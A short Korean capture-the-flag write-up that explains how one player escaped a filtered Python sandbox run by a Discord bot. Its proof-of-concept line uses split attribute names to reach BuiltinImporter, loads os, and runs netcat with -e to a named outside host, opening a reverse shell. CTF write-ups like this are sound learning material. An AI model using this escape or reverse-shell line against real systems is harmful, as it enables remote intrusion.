# 키워드 
- Python jailbreak


# 풀이과정(n0paew님 풀이)

- 해당 문제에서 주어진 discord에 접속하면 다음과 같이 bot이 하나 존재
![[Pasted image 20240120152424.png]]

- 문제에서 주어진 소스코드를 보면 discord 관리자만 해당 봇을 통해 동작시킬 수 있는 것을 확인할 수 있다.
![[Pasted image 20240120152507.png]]

- 따라서 discord 새로운 채널을 파서 bot을 추가하면 관리자 권한으로 해당 봇을 실행 시킬 수 있다.
![[Pasted image 20240120152529.png]]


- 해당 문제는 python jailbreak로 다음과 같이 필터랑 허용이 되어 있는 것을 볼 수 있다.
- 필터를 우회해서 문제를 풀면 되는 문제
![[Pasted image 20240120152551.png]]

- 파이썬 클래스 목록을 확인하기 위해 docker build 후, ''.__classs__.__mro__[1].__subclasses__() 를 통해 파이썬 클래스 목록을 확인
![[Pasted image 20240120152654.png]]


- 107번에 <class '_frozen_importlib.BuiltinImporter'> 통해 문제를 풀 예정
![[Pasted image 20240120152708.png]]

---
# Poc 코드
```python
getattr(getattr(getattr(present,'__cla'+'ss__'),'__ba'+'ses__')[0],'__subc'+'lasses__')()[107].load_module('os').system('nc n0paew.dev 8888 '+().__doc__[5:6]+'e '+[i for i in present.keys()][3])
```

- 위와 같이 server 열어두고 PoC를 dicord bot에다 보내면 reverse shell이 붙게되고 cat flag를 통해 flag를 얻을 수 있다.